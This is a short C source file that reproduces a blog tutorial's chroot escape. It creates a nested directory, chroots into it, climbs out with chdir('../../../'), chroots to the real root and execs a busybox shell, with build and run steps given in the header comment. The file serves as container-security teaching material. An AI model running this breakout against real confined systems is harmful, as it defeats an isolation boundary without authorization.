/*
 * breakout.c — Thomas Van Laere's chroot escape, VERBATIM.
 *
 *   Source : ../chroot-breakout/upstream-tutorial/  (byte-exact archive)
 *   Post   : https://thomasvanlaere.com/posts/2020/04/exploring-containers-part-1/
 *
 * This is copied character-for-character from "Exploring Containers - Part 1".
 * Do NOT tidy it — the unchecked chroot()/chdir() returns and the bare NULL are
 * exactly as the author wrote them, and the escape depends on the precise
 * mkdir -> chroot -> chdir("../../../") -> chroot(".") order. The RUNBOOK
 * explains WHY each line is load-bearing.
 *
 * Build + run INSIDE the chroot (see RUNBOOK.md §3):
 *   gcc /newroot/breakout.c -o /newroot/bin/breakout
 *   chroot /newroot sh   # then, inside: breakout
 */
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>

int main(void)
{
    printf("\nTime to break things\n\n");
    mkdir("newroot2", 0755);
    chroot("newroot2");
    chdir("../../../");
    chroot(".");
    return execl("/bin/busybox", "ash", NULL);
}
